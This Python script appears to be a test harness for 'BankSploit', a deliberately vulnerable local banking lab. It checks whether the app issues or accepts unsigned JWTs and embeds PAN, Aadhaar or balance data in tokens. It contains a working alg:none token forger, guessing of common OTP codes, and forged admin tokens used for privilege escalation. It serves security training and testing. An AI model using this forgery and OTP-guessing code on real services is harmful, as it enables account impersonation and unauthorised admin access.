#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BankSploit JWT Vulnerability Test
Tests auth.l12 (JWT alg:none) and auth.l17 (PII in JWT)
"""

import urllib.request
import urllib.parse
import json
import base64
import time
import re
import sys

# Force UTF-8 output
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

BASE_URL = "http://localhost:9443"

print("=" * 70)
print("BankSploit JWT Vulnerability Test")
print("=" * 70)

# ============================================================================
# Helper: Forge a JWT with alg:none
# ============================================================================
def forge_jwt_alg_none(customer_id, role='user'):
    """Create a JWT with alg=none (no signature required)"""
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }

    def b64url(data):
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

    header_b64 = b64url(json.dumps(header).encode())
    payload_b64 = b64url(json.dumps(payload).encode())

    # alg:none means empty signature
    return f"{header_b64}.{payload_b64}."

# ============================================================================
# Test 1: Verify legitimate login and JWT generation
# ============================================================================
print("\n[TEST 1] Legitimate Login & JWT Generation")
print("-" * 70)

test_user = {
    "customer_id": "BS100001",
    "password": "SecurePass@123"
}

try:
    # Step 1: Send login request
    login_data = urllib.parse.urlencode(test_user).encode('utf-8')
    req = urllib.request.Request(
        f"{BASE_URL}/api/v1/auth/login",
        data=login_data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )

    with urllib.request.urlopen(req) as resp:
        login_result = json.loads(resp.read().decode('utf-8'))

    if login_result.get('ok'):
        print("[✓] Login successful")
        print(f"    Customer ID: {login_result.get('customer_id')}")
        print(f"    OTP Required: {login_result.get('otp_required')}")
    else:
        print(f"[✗] Login failed: {login_result.get('error')}")
        exit(1)

    # Step 2: Send OTP verification (use leaked OTP from response if available)
    otp_code = login_result.get('otp')
    if not otp_code:
        # Try all common test codes
        for test_otp in ['000000', '123456', '111111']:
            otp_data = urllib.parse.urlencode({"otp": test_otp}).encode('utf-8')
            otp_req = urllib.request.Request(
                f"{BASE_URL}/api/v1/auth/verify-otp",
                data=otp_data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": f"PHPSESSID=test"
                }
            )
            try:
                with urllib.request.urlopen(otp_req) as otp_resp:
                    otp_result = json.loads(otp_resp.read().decode('utf-8'))
                    if otp_result.get('ok'):
                        otp_code = test_otp
                        break
            except:
                pass

    if otp_code:
        otp_data = urllib.parse.urlencode({"otp": otp_code}).encode('utf-8')
        otp_req = urllib.request.Request(
            f"{BASE_URL}/api/v1/auth/verify-otp",
            data=otp_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )

        with urllib.request.urlopen(otp_req) as otp_resp:
            otp_result = json.loads(otp_resp.read().decode('utf-8'))

        if otp_result.get('ok'):
            jwt_token = otp_result.get('token')
            print("[✓] OTP verified, JWT issued")
            print(f"    Token (first 50 chars): {jwt_token[:50]}...")

            # Decode and inspect the JWT
            parts = jwt_token.split('.')
            if len(parts) == 3:
                try:
                    # Decode without verification
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

                    print(f"    JWT Header: {json.dumps(header)}")
                    print(f"    JWT Payload: {json.dumps(payload, indent=6)}")

                    # Check for vulnerabilities
                    if header.get('alg') == 'none':
                        print("[⚠] VULNERABILITY: JWT issued with alg=none (forgeable!)")

                    if header.get('alg') == 'HS256':
                        print("[✓] SECURE: JWT signed with HS256")

                    if 'pan' in payload or 'aadhaar' in payload or 'balance' in payload:
                        print("[⚠] VULNERABILITY: PII embedded in JWT (auth.l17):")
                        if 'pan' in payload:
                            print(f"    - PAN: {payload['pan']}")
                        if 'aadhaar' in payload:
                            print(f"    - Aadhaar: {payload['aadhaar']}")
                        if 'balance' in payload:
                            print(f"    - Balance: {payload['balance']}")
                    else:
                        print("[✓] SECURE: No PII in JWT")
                except Exception as e:
                    print(f"[!] Error decoding JWT: {e}")
        else:
            print(f"[✗] OTP verification failed: {otp_result.get('error')}")
    else:
        print("[!] Could not get OTP for testing")

except urllib.error.HTTPError as e:
    print(f"[!] HTTP Error {e.code}: {e.reason}")
    print(f"    The API endpoint may not exist yet. Check the app configuration.")
except Exception as e:
    print(f"[!] Error during login: {e}")

# ============================================================================
# Test 2: Forge and use alg:none JWT
# ============================================================================
print("\n[TEST 2] JWT Forgery with alg=none")
print("-" * 70)

forged_token = forge_jwt_alg_none("BS100001", role="user")
print(f"[*] Forged token with alg=none: {forged_token[:50]}...")

try:
    # Try to use forged token to access dashboard
    req = urllib.request.Request(
        f"{BASE_URL}/dashboard?access_token={forged_token}",
        headers={"Accept": "text/html"}
    )

    with urllib.request.urlopen(req) as resp:
        dashboard_html = resp.read().decode('utf-8')

    if "customer" in dashboard_html.lower() or "account" in dashboard_html.lower():
        print("[⚠] VULNERABILITY: Forged JWT (alg:none) accepted!")
        print("    - Attacker can forge tokens without knowing the signing key")
        print("    - Can impersonate any user by changing 'sub' claim")
    else:
        print("[✓] Forged JWT rejected (properly secured)")
except Exception as e:
    print(f"[!] Error testing forged JWT: {e}")

# ============================================================================
# Test 3: Privilege escalation with forged admin JWT
# ============================================================================
print("\n[TEST 3] Privilege Escalation (Admin Impersonation)")
print("-" * 70)

admin_forged_token = forge_jwt_alg_none("ADMIN001", role="admin")
print(f"[*] Forged admin token: {admin_forged_token[:50]}...")

try:
    req = urllib.request.Request(
        f"{BASE_URL}/admin/config?access_token={admin_forged_token}",
        headers={"Accept": "text/html"}
    )

    with urllib.request.urlopen(req) as resp:
        admin_html = resp.read().decode('utf-8')

    if "config" in admin_html.lower() or "admin" in admin_html.lower() or "level" in admin_html.lower():
        print("[⚠] CRITICAL: Admin impersonation via forged JWT successful!")
        print("    - Regular user can forge admin token")
        print("    - Can access admin panel without credentials")
    else:
        print("[✓] Admin JWT properly validated (cannot forge admin access)")
except Exception as e:
    print(f"[!] Error testing admin JWT: {e}")

# ============================================================================
# Test 4: Direct API endpoint with forged JWT
# ============================================================================
print("\n[TEST 4] API Endpoint Access with Forged JWT")
print("-" * 70)

forged_token = forge_jwt_alg_none("BS100234", role="user")

try:
    req = urllib.request.Request(
        f"{BASE_URL}/api/v1/accounts?access_token={forged_token}",
        headers={
            "Accept": "application/json",
            "Authorization": f"Bearer {forged_token}"
        }
    )

    with urllib.request.urlopen(req) as resp:
        api_result = json.loads(resp.read().decode('utf-8'))

    if isinstance(api_result, (dict, list)):
        if 'error' not in str(api_result).lower():
            print("[⚠] VULNERABILITY: Forged JWT accepted at API endpoint")
            print(f"    Response: {json.dumps(api_result, indent=6)[:200]}")
        else:
            print("[✓] API endpoint properly rejected forged JWT")
    else:
        print("[✓] API endpoint properly rejected forged JWT")
except urllib.error.HTTPError as e:
    if e.code == 401 or e.code == 403:
        print("[✓] API endpoint properly rejected forged JWT (403/401)")
    else:
        print(f"[!] Unexpected HTTP error: {e.code}")
except Exception as e:
    print(f"[!] Error testing API: {e}")

# ============================================================================
# Summary
# ============================================================================
print("\n" + "=" * 70)
print("Test Summary:")
print("=" * 70)
print("""
auth.l12 - JWT Algorithm Vulnerability:
  - Level 0: Issues and accepts alg=none (no signature) → FORGEABLE
  - Level 3: Issues and requires HS256 signature → SECURE

auth.l17 - PII in JWT:
  - Level 0: Embeds pan/aadhaar/balance in token → INFORMATION DISCLOSURE
  - Level 3: Only minimal claims (sub, role, exp, iat) → SECURE

If vulnerabilities are detected above, the CTF level is not set to 3 (secure).
Use the Training Lab or Admin Config to set levels to 3 to fix.
""")
print("=" * 70)
